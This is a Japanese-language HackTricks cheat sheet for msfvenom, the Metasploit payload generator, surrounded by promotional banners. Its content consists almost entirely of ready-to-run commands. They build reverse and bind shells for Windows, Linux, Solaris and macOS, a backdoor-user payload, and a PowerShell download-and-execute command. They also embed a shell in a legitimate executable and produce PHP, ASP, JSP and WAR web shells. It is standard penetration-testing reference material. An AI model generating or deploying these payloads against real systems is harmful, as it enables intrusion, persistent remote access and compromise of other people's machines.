# MSFVenom - チートシート

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローする
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリに PR を提出して、あなたのハッキングトリックを共有してください。

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルとチャレンジに深く入り込むコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、ハッキングの世界のペースに遅れずについていく

**最新のアナウンス**\
最新のバグバウンティの開始や重要なプラットフォームのアップデートに関する情報を入手する

**[Discord](https://discord.com/invite/N3FrSbmwdy) に参加して、今日からトップハッカーと協力を始めましょう！**

***

## 基本的な msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

`-a` を使用してアーキテクチャを指定するか、`--platform` を使用することもできます

## リスト化
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## シェルコードを作成する際の一般的なパラメータ
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **リバースシェル**

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### バインドシェル

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
{% endcode %}

### ユーザーの作成

{% code overflow="wrap" %}
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
{% endcode %}

### CMD シェル

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **コマンドの実行**

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
{% endcode %}

### エンコーダ

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### 実行可能ファイルに埋め込まれた

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
{% endcode %}

## Linux ペイロード

### リバースシェル

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
{% endcode %}

### バインドシェル

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
{% endcode %}

### SunOS（Solaris）

{% code overflow="wrap" %}
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC ペイロード**

### **リバースシェル:**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
{% endcode %}

### **バインドシェル**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
{% endcode %}

## **Webベースのペイロード**

### **PHP**

#### 逆シェル
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### リバースシェル
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### リバースシェル
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### リバースシェル
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
{% endcode %}

### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **スクリプト言語ペイロード**

### **Perl**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
{% endcode %}

### **Python**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
{% endcode %}

### **Bash**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！

**ハッキングの洞察力**\
ハッキングのスリルとチャレンジに深く入り込むコンテンツと関わりましょう

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、ハッキングの世界を最新の状態で把握しましょう

**最新のお知らせ**\
最新のバグバウンティの開始や重要なプラットフォームのアップデートについて情報を得ましょう

**[Discord](https://discord.com/invite/N3FrSbmwdy)** に参加して、今日からトップハッカーと協力しましょう！

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** で、ゼロからヒーローまでAWSハッキングを学びましょう！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com) を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つけましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローしましょう
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有しましょう

</details>
